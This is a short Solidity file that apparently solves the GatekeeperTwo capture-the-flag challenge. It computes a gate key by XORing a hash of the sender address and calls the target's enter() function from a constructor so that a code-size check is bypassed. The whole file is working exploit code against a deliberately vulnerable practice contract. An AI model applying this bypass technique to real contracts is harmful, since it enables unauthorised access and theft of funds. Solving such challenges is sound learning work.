// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeyCalculator {

    function getGateKey(address sender) external pure returns(bytes8) {
        uint64 v0 = uint64(bytes8(keccak256(abi.encodePacked(sender))));
        uint64 v2 = uint64(0xFFFFFFFFFFFFFFFF); // Underflow not possible in solidity 8, this == uint64(0) - 1
        uint64 v3 = v0 ^ v2;
        return(bytes8(v3));
    }
}

contract OpenGateTwo {

    constructor (address send, bytes8 _gateKey) {
      IGatekeeperTwo(send).enter(_gateKey);
    }

}
